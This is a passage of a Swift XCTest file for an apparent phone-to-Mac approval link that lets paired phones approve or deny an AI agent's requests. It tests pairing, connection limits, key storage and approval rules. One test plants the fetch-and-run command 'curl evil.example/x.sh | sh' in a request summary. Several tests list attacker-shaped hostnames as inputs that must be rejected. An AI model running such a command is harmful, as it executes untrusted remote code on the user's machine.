        func mode(_ p: String) -> Int { ((try? FileManager.default.attributesOfItem(atPath: p)[.posixPermissions]) as? NSNumber)?.intValue ?? -1 }
        XCTAssertEqual(mode(url.path), 0o600)
        XCTAssertEqual(mode(dir.path), 0o700)
    }
}

actor NameBox { var value: String?; func set(_ s: String) { value = s } }


final class AuditRun3HostTests: XCTestCase {
    func testOnePeerGuessingWrongCannotBlockTheRealPhone() async throws {
        let pairing = PairingManager(storeURL: nil)
        let offer = await pairing.createOffer()
        for _ in 0..<5 {
            let bad = PairingClient.request(material: Data("nope".utf8), deviceName: "x")
            _ = try? await pairing.redeem(bad, peer: "100.1.1.1", accept: { _ in true })
        }
        let good = PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "Real")
        _ = try await pairing.redeem(good, peer: "100.2.2.2", accept: { _ in true })
    }

    func testSwitchingTheLinkOffDisconnectsPhonesAndRefusesNewOnes() async throws {
        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        await host.shutdown()
        let connected = await host.connectedCount()
        XCTAssertEqual(connected, 0)
        try? await client.send(.submit("after off"))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertTrue(engine.calls.isEmpty)
        do { _ = try await h.connect(host, id, psk); XCTFail("a new connection must be refused") } catch {}
    }

    func testSilentConnectionsAreDroppedAndTheUnauthenticatedCountIsCapped() async throws {
        let h = LinkTests()
        let (host, _, _, _) = await h.makeHost()
        var silent: [MemoryTransport] = []
        for _ in 0..<(LinkHost.maxPreAuth + 4) {
            let (a, b) = MemoryTransport.pair()
            silent.append(a)
            Task { await host.serve(b) }
        }
        try await Task.sleep(nanoseconds: 300_000_000)
        // The first maxPreAuth stay open waiting; the extra ones were closed at once.
        var closedAtOnce = 0
        for t in silent.suffix(4) { if (try? await LinkHost.within(0.2, t) { try await t.receive() }) == nil { closedAtOnce += 1 } }
        XCTAssertEqual(closedAtOnce, 4)
    }
}

final class AuditRun3SizeTests: XCTestCase {
    func testAHugeEntryIsCutAndThePhoneStaysConnected() async throws {
        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var s = h.snapshot()
        s.transcriptTail = [LinkEntry(id: 1, role: "tool", text: String(repeating: "x", count: 2_000_000))]
        s.request?.summary = String(repeating: "y", count: 2_000_000)
        await host.publish(s)
        let got = try await h.nextSnapshot(client)
        XCTAssertLessThan(got.transcriptTail[0].text.count, 5000)
        XCTAssertLessThan(got.request?.summary.count ?? 0, 2100)
        let connected = await host.connectedCount()
        XCTAssertEqual(connected, 1)
        try await client.send(.approve(requestID: "R1", method: .voice, auth: .none))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertTrue(engine.calls.isEmpty, "its summary was cut, so the phone may not approve it")
    }
}

final class PhoneSideTests: XCTestCase {
    func testQRPayloadRoundTripsAndRejectsJunk() async {
        let m = PairingManager(storeURL: nil)
        let offer = await m.createOffer()
        let parsed = PairingPayload.parse(offer.qrPayload(host: "100.100.1.2", port: 47821))
        XCTAssertEqual(parsed?.host, "100.100.1.2")
        XCTAssertEqual(parsed?.port, 47821)
        XCTAssertEqual(parsed?.material.count, 16)
        for bad in ["", "https://pair?h=a&p=47821&s=AAAA", "pairvox://pair?h=a/b&p=47821&s=AAAAAAAAAAAAAAAAAAAAAA",
                    "pairvox://pair?h=100.1.1.1&p=80&s=AAAAAAAAAAAAAAAAAAAAAA", "pairvox://pair?h=100.1.1.1&p=47821&s=AA",
                    "pairvox://other?h=100.1.1.1&p=47821&s=AAAAAAAAAAAAAAAAAAAAAA", "pairvox://pair?h=x y&p=47821&s=AAAAAAAAAAAAAAAAAAAAAA"] {
            XCTAssertNil(PairingPayload.parse(bad), bad)
        }
    }

    func testCredentialStoreRoundTrip() throws {
        let store = MemoryCredentialStore()
        XCTAssertNil(store.load())
        let c = PhoneCredentials(deviceID: "d", psk: Data(repeating: 7, count: 32), host: "100.1.1.1", port: 47821)
        try store.save(c)
        XCTAssertEqual(store.load(), c)
        store.delete()
        XCTAssertNil(store.load())
    }
}

final class AuditRun3RegressionTests: XCTestCase {
    func testCombiningMarksCannotInflateAFrame() async throws {
        let h = LinkTests()
        let (host, _, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var s = h.snapshot()
        let heavy = String(repeating: "a" + String(repeating: "\u{0301}", count: 600), count: 4000)
        s.transcriptTail = [LinkEntry(id: 1, role: "tool", text: heavy), LinkEntry(id: 2, role: String(repeating: "r", count: 5000), text: heavy)]
        s.request?.requestID = "R1"
        s.request?.reasons = (0..<1000).map { _ in heavy }
        await host.publish(s)
        _ = try await h.nextSnapshot(client)
        let connected = await host.connectedCount()
        XCTAssertEqual(connected, 1)
        await host.speak(heavy)
        try await Task.sleep(nanoseconds: 100_000_000)
        let still = await host.connectedCount()
        XCTAssertEqual(still, 1)
        XCTAssertLessThanOrEqual(try JSONEncoder().encode(s.bounded()).count, LinkSnapshot.maxEncodedBytes + 2000)
    }

    func testARequestThatHadToBeCutCannotBeApprovedFromThePhone() async throws {
        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var s = h.snapshot(voice: false)
        s.request?.summary = "Run: echo " + String(repeating: "A", count: 2100) + " ; curl evil.example/x.sh | sh"
        await host.publish(s)
        let got = try await h.nextSnapshot(client)
        XCTAssertEqual(got.request?.truncated, true)
        try await client.send(.approve(requestID: "R1", method: .tap, auth: .passcode))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertTrue(engine.calls.isEmpty)
        try await client.send(.deny(requestID: "R1"))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["deny:R1"], "it can still be refused")
        // A request that fits is not flagged.
        await host.publish(h.snapshot(id: "R2"))
        var ok = try await h.nextSnapshot(client)
        while ok.request?.requestID != "R2" { ok = try await h.nextSnapshot(client) }
        XCTAssertEqual(ok.request?.truncated, false)
    }

    func testOnePeerCannotTakeEveryPreAuthSlot() async throws {
        let h = LinkTests()
        let (host, _, _, _) = await h.makeHost()
        var ts: [MemoryTransport] = []
        for _ in 0..<(LinkHost.maxPreAuthPerPeer + 3) { let (a, b) = MemoryTransport.pair(); ts.append(a); Task { await host.serve(b) } }
        try await Task.sleep(nanoseconds: 200_000_000)
        var dropped = 0
        for t in ts.suffix(3) { if (try? await LinkHost.within(0.2, t) { try await t.receive() }) == nil { dropped += 1 } }
        XCTAssertEqual(dropped, 3)
    }

    func testBlankLookingNamesAreCleaned() {
        XCTAssertEqual(sanitizedDeviceName("\u{3164}\u{3164}"), "Unnamed phone")
    }
}

final class PhoneHostRuleTests: XCTestCase {
    func testPhonesOnlyPairWithTailnetHosts() {
        for ok in ["100.101.102.103", "100.64.0.1", "100.127.1.1", "127.0.0.1", "localhost", "my-mac.tail1234.ts.net", "fd7a:115c:a1e0::1"] {
            XCTAssertTrue(PairingPayload.isAllowedHost(ok), ok)
        }
        for bad in ["8.8.8.8", "attacker.example.com", "한글.ts.net", "аpple.ts.net", "ts.net", ".ts.net", "-x.ts.net", "100.63.0.1", "100.128.0.1",
                    "192.168.1.5", "fe80::1", "a..ts.net", "100.100.100.100.5", "0x7f.1", "evil.com.ts.net.evil.com"] {
            XCTAssertFalse(PairingPayload.isAllowedHost(bad), bad)
        }
        XCTAssertNil(PairingPayload.parse("pairvox://pair?h=8.8.8.8&p=47821&s=AAAAAAAAAAAAAAAAAAAAAA"))
    }

    // Security audit 2026-10-24: the IPv6 rule was a prefix test, so a DNS name that starts like a Tailscale address
    // passed, and leading-zero octets passed a decimal check that a resolver may read as octal.
    func testNamesShapedLikeTailnetAddressesAreRefused() {
        for ok in ["fd7a:115c:a1e0::1", "fd7a:115c:a1e0:ab12:4843:cd96:6258:b240", "FD7A:115C:A1E0::53", "::1", "100.64.0.1", "100.100.0.10"] {
            XCTAssertTrue(PairingPayload.isAllowedHost(ok), ok)
        }
        for bad in ["fd7a:115c:a1e0:x.attacker.example", "fd7a:115c:a1e0:evil", "fd7a:115c:a1e0::1::2", "fd7a:115c:a1e0:1:2:3:4:5:6", "fd7a:115c:a1e1::1",
                    "fd7a:115c:a1e0::12345", "100.070.0.1", "100.64.0.01", "0100.64.0.1", "100.64.1", "127.1"] {
            XCTAssertFalse(PairingPayload.isAllowedHost(bad), bad)
        }
        XCTAssertNil(PairingPayload.parse("pairvox://pair?h=fd7a:115c:a1e0:x.attacker.example&p=47821&s=AAAAAAAAAAAAAAAAAAAAAA"))
    }
}

final class DeviceKeyStoreTests: XCTestCase {
    func testKeysLiveInTheKeyStoreNotInTheFile() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-keys-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired.json")
        let keys = MemoryDeviceKeyStore()
        let m = PairingManager(storeURL: url, keys: keys)
        let offer = await m.createOffer()
        let grant = try await m.redeem(PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "A"), accept: { _ in true })
        _ = grant
        let device = await m.pairedDevices()[0]
        let file = try String(contentsOf: url, encoding: .utf8)
        XCTAssertFalse(file.contains(device.psk.base64EncodedString()), "the key is not in the file")
        XCTAssertEqual(keys.key(for: device.id), device.psk)
        let reloaded = PairingManager(storeURL: url, keys: keys)
        let again = await reloaded.activeDevice(device.id)
        XCTAssertEqual(again?.psk, device.psk)
        try await reloaded.revoke(device.id)
        XCTAssertNil(keys.key(for: device.id), "revoking destroys the key")
    }

    func testAnOlderFileWithKeysInsideIsConvertedAndAMissingKeyBlocksThePhone() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-mig-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired.json")
        let psk = Handshake.randomBytes(32)
        let d1id = UUID().uuidString, d2id = UUID().uuidString
        let old = [PairedDevice(id: d1id, name: "Old", psk: psk, createdAt: Date(), revoked: false),
                   PairedDevice(id: d2id, name: "Lost key", psk: Data(), createdAt: Date(), revoked: false)]
        try JSONEncoder().encode(old).write(to: url)
        let keys = MemoryDeviceKeyStore()
        let m = PairingManager(storeURL: url, keys: keys)
        let d1 = await m.activeDevice(d1id)
        let d2 = await m.activeDevice(d2id)
        XCTAssertEqual(d1?.psk, psk)
        XCTAssertNil(d2, "no key, no access")
        XCTAssertEqual(keys.key(for: d1id), psk)
        XCTAssertFalse(try String(contentsOf: url, encoding: .utf8).contains(psk.base64EncodedString()), "the file was rewritten without the key")
    }
}

final class ControlChannelTests: XCTestCase {
    struct Echo: LinkCommandHandler {
        func handle(_ r: LinkCommand) async -> LinkCommandReply {
            var out = LinkCommandReply(ok: r.cmd != "fail", error: r.cmd == "fail" ? "nope" : nil)
            out.status = "cmd=\(r.cmd) id=\(r.id ?? "-") kind=\(r.kind ?? "-")"
            return out
        }
    }

    func testRequestsRoundTripAndTheSocketIsPrivate() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pvc-\(Int.random(in: 0...99999))")
        defer { try? FileManager.default.removeItem(at: dir) }
        let path = dir.appendingPathComponent("c.sock").path
        let server = LinkCommandServer(path: path, handler: Echo())
        try server.start()
        defer { server.stop() }
        let mode = (try FileManager.default.attributesOfItem(atPath: path)[.posixPermissions] as? NSNumber)?.intValue
        XCTAssertEqual(mode, 0o600)
        let dirMode = (try FileManager.default.attributesOfItem(atPath: dir.path)[.posixPermissions] as? NSNumber)?.intValue
        XCTAssertEqual(dirMode, 0o700)
        let ok = try LinkCommandClient.send(LinkCommand(cmd: "offer", id: nil, kind: "qr"), path: path)
        XCTAssertTrue(ok.ok)
        XCTAssertEqual(ok.status, "cmd=offer id=- kind=qr")
        let bad = try LinkCommandClient.send(LinkCommand(cmd: "fail"), path: path)
        XCTAssertFalse(bad.ok)
        XCTAssertEqual(bad.error, "nope")
    }

    func testNothingListeningIsReportedAsNotRunning() {
        XCTAssertThrowsError(try LinkCommandClient.send(LinkCommand(cmd: "status"), path: "/tmp/pv-nothing-\(Int.random(in: 0...99999)).sock")) {
            XCTAssertEqual($0 as? LinkCommandError, .notRunning)
        }
    }

    func testAStaleSocketFileIsReplacedButAForeignFileIsNeverDeleted() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pvs-\(Int.random(in: 0...99999))")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let path = dir.appendingPathComponent("c.sock").path
        try Data("not a socket".utf8).write(to: URL(fileURLWithPath: path))
        XCTAssertThrowsError(try LinkCommandServer(path: path, handler: Echo()).start(), "a regular file is left alone")
        XCTAssertTrue(FileManager.default.fileExists(atPath: path))
        try FileManager.default.removeItem(atPath: path)
        let first = LinkCommandServer(path: path, handler: Echo()); try first.start()
        XCTAssertThrowsError(try LinkCommandServer(path: path, handler: Echo()).start(), "a live server is not replaced")
        first.stop()
        let again = LinkCommandServer(path: path, handler: Echo()); try again.start(); again.stop()
    }
}

/// A transport whose send has delivered the frame but takes a while to return, as a real write can. While the host
/// waits there, the phone already has what was sent and can answer it.
final class LateReturnTransport: LinkTransport, @unchecked Sendable {
    private let inner: LinkTransport
    private let lock = NSLock()
    private var lateBy: TimeInterval = 0
    init(_ inner: LinkTransport) { self.inner = inner }
    var peer: String? { inner.peer }
    func returnLate(by seconds: TimeInterval) { lock.lock(); lateBy = seconds; lock.unlock() }
    func send(_ data: Data) async throws {
        try await inner.send(data)
        lock.lock(); let wait = lateBy; lock.unlock()
        if wait > 0 { try? await Task.sleep(nanoseconds: UInt64(wait * 1_000_000_000)) }
    }
    func receive() async throws -> Data { try await inner.receive() }
    func close() async { await inner.close() }
}

/// Owner requirement, 2026-10-17: switch projects from the phone.
final class PhoneProjectSwitchTests: XCTestCase {
    func testThePhoneCanSwitchToAProjectItWasShownAndNothingElse() async throws {
        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var snap = h.snapshot(); snap.activeProjectID = "A"
        snap.projects = [LinkProject(id: "A", name: "api", isActive: true, needsAttention: false, missed: 0),
                         LinkProject(id: "B", name: "website", isActive: false, needsAttention: true, missed: 2)]
        await host.publish(snap)
        let got = try await h.nextSnapshot(client)
        XCTAssertEqual(got.projects?.map(\.name), ["api", "website"], "the phone is told which projects are open")
        try await client.send(.switchProject(projectID: "B"))
        let deadline = Date().addingTimeInterval(2)
        while engine.calls.isEmpty, Date() < deadline { try? await Task.sleep(nanoseconds: 20_000_000) }
        XCTAssertEqual(engine.calls, ["switch:B"])
        // An id the phone was never shown is refused, and the app is not asked.
        try await client.send(.switchProject(projectID: "not-open"))
        try? await Task.sleep(nanoseconds: 200_000_000)
        XCTAssertEqual(engine.calls, ["switch:B"])
        withExtendedLifetime(host) {}
    }
}

/// The phone's spoken answers are decided by the Mac with the Mac's parser and voice rules.
final class PhoneSpokenAnswerTests: XCTestCase {
    func connected(_ request: LinkRequest) async throws -> (LinkHost, FakeEngine, LinkClient) {
        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var snap = h.snapshot(); snap.request = request
        await host.publish(snap)
        _ = try await h.nextSnapshot(client)
        return (host, engine, client)
    }

    func waitForCall(_ engine: FakeEngine) async {
        let deadline = Date().addingTimeInterval(2)
        while engine.calls.isEmpty, Date() < deadline { try? await Task.sleep(nanoseconds: 20_000_000) }
    }

    func testAllowWithAFullStopApprovesARequestTheMacAllowsByVoice() async throws {
        let (host, engine, client) = try await connected(LinkRequest(requestID: "R", summary: "Edit a.swift", spokenPrompt: "x",
                                                                       risk: "medium", reasons: [], voiceApprovable: true))
        try await client.send(.spokenAnswer(requestID: "R", text: "Allow."))
        await waitForCall(engine)
        XCTAssertEqual(engine.calls, ["approve:R"])
        withExtendedLifetime(host) {}
    }

    func testASpokenAllowCannotApproveWhatTheMacKeepsForTheScreen() async throws {
        let (host, engine, client) = try await connected(LinkRequest(requestID: "H", summary: "Run: git push", spokenPrompt: "x",
                                                                       risk: "high", reasons: [], voiceApprovable: false))
        try await client.send(.spokenAnswer(requestID: "H", text: "Allow."))
        try? await Task.sleep(nanoseconds: 250_000_000)
        XCTAssertTrue(engine.calls.isEmpty)
        withExtendedLifetime(host) {}
    }

    func testNoDeniesAndAMumbleIsAskedAgain() async throws {
        let (host, engine, client) = try await connected(LinkRequest(requestID: "R", summary: "Edit a.swift", spokenPrompt: "x",
                                                                       risk: "medium", reasons: [], voiceApprovable: true))
        try await client.send(.spokenAnswer(requestID: "R", text: "Yasp."))
        var askedAgain = false
        let deadline = Date().addingTimeInterval(2)
        while !askedAgain, Date() < deadline {
            if case .speak(let t) = try await client.receive() { askedAgain = t.contains("yes or a no") }
        }
        XCTAssertTrue(askedAgain)
        XCTAssertTrue(engine.calls.isEmpty, "a mumble answers nothing")
        try await client.send(.spokenAnswer(requestID: "R", text: "No."))
        await waitForCall(engine)
        XCTAssertEqual(engine.calls, ["deny:R"])
        withExtendedLifetime(host) {}
    }
}

/// The Mac's voice reaches the phone as audio (owner, 2026-10-18: the phone's own voice sounded robotic).
final class PhoneSpeakAudioTests: XCTestCase {
    func connected() async throws -> (LinkHost, LinkClient) {
        let h = LinkTests()
        let (host, _, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        await host.publish(h.snapshot())
        _ = try await h.nextSnapshot(client)
        return (host, client)
    }

    func nextSpoken(_ client: LinkClient) async throws -> HostMessage {
        while true {
            let m = try await client.receive()
            switch m {
            case .speak, .speakAudio, .stopSpeaking: return m
            default: continue
            }
        }
    }

    func testAudioArrivesWholeAndInOrderThenTheStop() async throws {
        let (host, client) = try await connected()
        let first = Data((0..<70_000).map { UInt8($0 % 251) })   // about the size of a long sentence
        let second = Data([1, 2, 3])
        await host.speakAudio(format: "m4a-aac", data: first, text: "One.")
        await host.speakAudio(format: "m4a-aac", data: second, text: "Two.")
        await host.stopSpeaking()
        let a = try await nextSpoken(client), b = try await nextSpoken(client), c = try await nextSpoken(client)
        XCTAssertEqual(a, .speakAudio(format: "m4a-aac", data: first, text: "One."))
        XCTAssertEqual(b, .speakAudio(format: "m4a-aac", data: second, text: "Two."))
        XCTAssertEqual(c, .stopSpeaking)
        withExtendedLifetime(host) {}
    }

    func testAudioTooLargeForAFrameIsSentAsText() async throws {
        let (host, client) = try await connected()
        let tooBig = Data(count: LinkHost.maxSpeakAudioBytes + 1)
        await host.speakAudio(format: "m4a-aac", data: tooBig, text: "A very long sentence.")
        let m = try await nextSpoken(client)
        XCTAssertEqual(m, .speak("A very long sentence."))
        withExtendedLifetime(host) {}
    }
}

final class ShownBeforeSentTests: XCTestCase {
    /// The race behind the CI failures of the cross-project phone tests: the host marked a request as shown only
    /// after its send returned, so a phone that answered while the host was still inside that send was refused
    /// ("not shown on this phone yet"), permanently. The request now counts as shown before the send.
    func testAnAnswerThatArrivesWhileTheSendIsStillReturningIsAccepted() async throws {
        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let (a, b) = MemoryTransport.pair()
        let late = LateReturnTransport(b)
        Task { await host.serve(late) }
        let client = try await LinkClient.connect(over: a, deviceID: id, psk: psk)
        late.returnLate(by: 1.0)
        await host.publish(h.snapshot(id: "R"))
        _ = try await h.nextSnapshot(client)
        try await client.send(.approve(requestID: "R", method: .tap, auth: .none))
        let deadline = Date().addingTimeInterval(0.8)   // well inside the host's one-second send
        while engine.calls.isEmpty, Date() < deadline { try? await Task.sleep(nanoseconds: 20_000_000) }
        XCTAssertEqual(engine.calls, ["approve:R"])
        withExtendedLifetime(host) {}
    }
}

final class CrossProjectPhoneTests: XCTestCase {
    func high(id: String = "H", project: String? = nil, name: String? = nil, screen: Bool = false) -> LinkRequest {
        LinkRequest(requestID: id, summary: "Run: git push", spokenPrompt: "x", risk: "high", reasons: [], voiceApprovable: false,
                    needsScreen: screen, projectID: project, projectName: name)
    }

    func connected(_ h: LinkTests, _ snap: LinkSnapshot) async throws -> (LinkHost, FakeEngine, LinkClient) {
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        await host.publish(snap)
        _ = try await h.nextSnapshot(client)
        return (host, engine, client)
    }

    func settle() async { try? await Task.sleep(nanoseconds: 150_000_000) }
    /// Waits until the engine has seen exactly these calls (or two seconds pass): a fixed 150 ms wait was too short
    /// under a full test run and failed now and then. Absence checks keep `settle()`.
    func settle(until expected: [String], _ engine: FakeEngine) async {
        let deadline = Date().addingTimeInterval(2)
        while engine.calls != expected, Date() < deadline { try? await Task.sleep(nanoseconds: 20_000_000) }
    }

    func testHighRiskByVoiceNeedsTheMacSwitchAndASecondConfirmationOnThePhone() async throws {
        let h = LinkTests()
        var snap = h.snapshot(); snap.request = high()
        // Switch off on the Mac: voice never works, a tap does, but only from a phone with a passcode (audit run 7).
        var (host, engine, client) = try await connected(h, snap)
        try await client.send(.approve(requestID: "H", method: .voice, auth: .faceID))
        try await client.send(.approve(requestID: "H", method: .tap, auth: .none))
        await settle(); XCTAssertTrue(engine.calls.isEmpty)
        try await client.send(.approve(requestID: "H", method: .tap, auth: .faceID))
        await settle(until: ["approve:H"], engine); XCTAssertEqual(engine.calls, ["approve:H"])
        // Switch on: voice needs Face ID, Touch ID or the passcode as well.
        snap.voiceHighRisk = true
        (host, engine, client) = try await connected(h, snap)
        try await client.send(.approve(requestID: "H", method: .voice, auth: .none))
        await settle(); XCTAssertTrue(engine.calls.isEmpty, "the phrase alone is not enough on the phone")
        try await client.send(.approve(requestID: "H", method: .voice, auth: .touchID))
        await settle(until: ["approve:H"], engine); XCTAssertEqual(engine.calls, ["approve:H"])
        _ = host
    }

    func testNeedsTheScreenRequestsHaveTheirOwnSwitchOnThePhoneToo() async throws {
        let h = LinkTests()
        var snap = h.snapshot(); snap.request = high(screen: true); snap.voiceHighRisk = true
        // The host is kept until the end: discarded with `_`, it could be freed before the phone's approval reached
        // it, and the engine then saw nothing at all (failed on CI and once locally; waiting longer did not help).
        var (host, engine, client) = try await connected(h, snap)
        try await client.send(.approve(requestID: "H", method: .voice, auth: .passcode))
        await settle(); XCTAssertTrue(engine.calls.isEmpty)
        snap.voiceNeedsScreen = true
        (host, engine, client) = try await connected(h, snap)
        try await client.send(.approve(requestID: "H", method: .voice, auth: .passcode))
        await settle(until: ["approve:H"], engine); XCTAssertEqual(engine.calls, ["approve:H"])
        withExtendedLifetime(host) {}
    }

    func testARequestInAnotherProjectIsAnsweredInThatProjectUnderTheSameRules() async throws {
        let h = LinkTests()
        var snap = h.snapshot()
        snap.request = nil
        snap.others = [LinkRequest(requestID: "W1", summary: "Edit pricing.html", spokenPrompt: "x", risk: "medium", reasons: [], voiceApprovable: true,
                                   projectID: "web", projectName: "website"),
                       high(id: "W2", project: "web", name: "website")]
        let (host, engine, client) = try await connected(h, snap)   // kept to the end, see the test above
        // Without the project the request does not exist.
        try await client.send(.approve(requestID: "W1", method: .voice, auth: .none))
        await settle(); XCTAssertTrue(engine.calls.isEmpty)
        // With the project: medium by voice works and goes to that project.
        try await client.send(.approve(requestID: "W1", method: .voice, auth: .none, projectID: "web"))
        await settle(until: ["approve:W1@web"], engine); XCTAssertEqual(engine.calls, ["approve:W1@web"])
        // A wrong project does not match.
        try await client.send(.approve(requestID: "W1", method: .tap, auth: .none, projectID: "api"))
        // High risk elsewhere obeys the same rule: voice without the switch is refused.
        try await client.send(.approve(requestID: "W2", method: .voice, auth: .faceID, projectID: "web"))
        await settle(until: ["approve:W1@web"], engine); XCTAssertEqual(engine.calls, ["approve:W1@web"])
        try await client.send(.deny(requestID: "W2", projectID: "web"))
        await settle(); XCTAssertEqual(engine.calls.last, "deny:W2@web")
        withExtendedLifetime(host) {}
    }

    func testOtherProjectRequestsAreBoundedToo() {
        var s = LinkSnapshot(phase: "idle", project: "p", transcriptTail: [], request: nil, queuedRequests: 0)
        s.others = (0..<50).map { LinkRequest(requestID: "r\($0)", summary: String(repeating: "x", count: 5000), spokenPrompt: "", risk: "low", reasons: [], voiceApprovable: true, projectID: "p", projectName: "n") }
        let b = s.bounded()
        XCTAssertEqual(b.others.count, 10)
        XCTAssertTrue(b.others.allSatisfy { $0.truncated && $0.summary.utf8.count < 2200 })
    }
}

final class AuditRun4LinkTests: XCTestCase {
    func testAPlantedFileWithAKeyInsideIsNotTrustedAfterTheFirstRun() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-plant-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired.json")
        let keys = MemoryDeviceKeyStore()
        _ = PairingManager(storeURL: url, keys: keys)      // first run: closes the one-time import
        XCTAssertTrue(keys.legacyImportClosed)
        let planted = [PairedDevice(id: "evil", name: "Anthony's iPhone", psk: Handshake.randomBytes(32), createdAt: Date(), revoked: false)]
        try JSONEncoder().encode(planted).write(to: url)
        let m = PairingManager(storeURL: url, keys: keys)
        let active = await m.activeDevice("evil")
        XCTAssertNil(active, "no Accept click, no phone")
        XCTAssertNil(keys.key(for: "evil"))
    }

    func testAMissingKeyDoesNotEraseThePairingForGood() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-miss-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired.json")
        let keys = MemoryDeviceKeyStore()
        let m = PairingManager(storeURL: url, keys: keys)
        let offer = await m.createOffer()
        _ = try await m.redeem(PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "A"), accept: { _ in true })
        let id = await m.pairedDevices()[0].id
        let key = keys.key(for: id)!
        keys.removeKey(for: id)                              // the Keychain is unreadable for a moment
        let blind = PairingManager(storeURL: url, keys: keys)
        let during = await blind.activeDevice(id)
        XCTAssertNil(during)
        try keys.setKey(key, for: id)                        // and comes back
        let later = PairingManager(storeURL: url, keys: keys)
        let after = await later.activeDevice(id)
        XCTAssertNotNil(after, "the phone was not revoked, only unavailable")
    }

    func testAFailedSaveLeavesNoPhoneBehind() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-fail-\(UUID().uuidString)")
        // The folder the file belongs in is a plain file, so the save cannot happen.
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        try Data("x".utf8).write(to: dir.appendingPathComponent("blocker"))
        let url = dir.appendingPathComponent("blocker/paired.json")
        defer { try? FileManager.default.removeItem(at: dir) }
        let keys = MemoryDeviceKeyStore()
        let m = PairingManager(storeURL: url, keys: keys)
        let offer = await m.createOffer()
        do { _ = try await m.redeem(PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "A"), accept: { _ in true }); XCTFail("must fail") } catch {}
        let list = await m.pairedDevices()
        XCTAssertTrue(list.isEmpty)
    }

    func testTheSameRequestKeepsItsAgeWhenTheMacSwitchesProjects() async throws {
        let h = LinkTests()
        let (host, engine, pairing, clock) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var onScreen = h.snapshot(id: "R"); onScreen.request?.projectID = nil; onScreen.activeProjectID = "A"
        await host.publish(onScreen)
        _ = try await h.nextSnapshot(client)
        clock.advance(290)
        // The Mac switches to project B; the same request now sits under "other projects".
        var moved = LinkSnapshot(phase: "idle", project: "b", transcriptTail: [], request: nil, queuedRequests: 0)
        moved.activeProjectID = "B"
        moved.others = [LinkRequest(requestID: "R", summary: "Edit a.swift", spokenPrompt: "x", risk: "low", reasons: [], voiceApprovable: true, projectID: "A", projectName: "a")]
        await host.publish(moved)
        _ = try await h.nextSnapshot(client)
        clock.advance(200)
        try await client.send(.approve(requestID: "R", method: .voice, auth: .none, projectID: "A"))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertTrue(engine.calls.isEmpty, "490 seconds old: not by voice")
        try await client.send(.approve(requestID: "R", method: .tap, auth: .none, projectID: "A"))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:R@A"])
    }

    /// Review task 3.6: an approval for the request on the phone's main card goes to the project that card belonged
    /// to, not to whichever project the Mac made active in the meantime.
    func testAnApprovalForTheShownRequestGoesToTheShownProject() async throws {
        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var onScreen = h.snapshot(id: "R"); onScreen.request?.projectID = nil; onScreen.activeProjectID = "A"
        await host.publish(onScreen)
        _ = try await h.nextSnapshot(client)
        try await client.send(.approve(requestID: "R", method: .tap, auth: .none, projectID: nil))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:R@A"])
        try await client.send(.deny(requestID: "R", projectID: nil))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls.last, "deny:R@A")
    }
}

final class AuditRun4MarkerTests: XCTestCase {
    func testAFileCannotNameAnythingButAPhoneIdAndOnlyRealKeysCount() async throws {
